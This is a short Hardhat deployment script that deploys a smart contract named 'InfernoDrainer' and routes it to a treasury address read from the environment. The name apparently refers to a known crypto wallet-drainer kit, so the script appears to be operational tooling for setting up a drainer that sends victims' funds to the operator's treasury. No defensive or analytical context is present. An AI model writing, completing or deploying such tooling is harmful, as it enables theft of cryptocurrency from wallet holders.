const hre = require("hardhat");

async function main() {
  const [deployer] = await hre.ethers.getSigners();
  console.log("Deploying with:", deployer.address);

  const treasury = process.env.TREASURY_ADDRESS;
  if (!treasury) throw new Error("Set TREASURY_ADDRESS in .env");

  const Drainer = await hre.ethers.getContractFactory("InfernoDrainer");
  const drainer = await Drainer.deploy(treasury);
  await drainer.waitForDeployment();

  console.log("InfernoDrainer deployed at:", await drainer.getAddress());
  console.log("Treasury:", treasury);
}

main().catch((e) => { console.error(e); process.exit(1); });
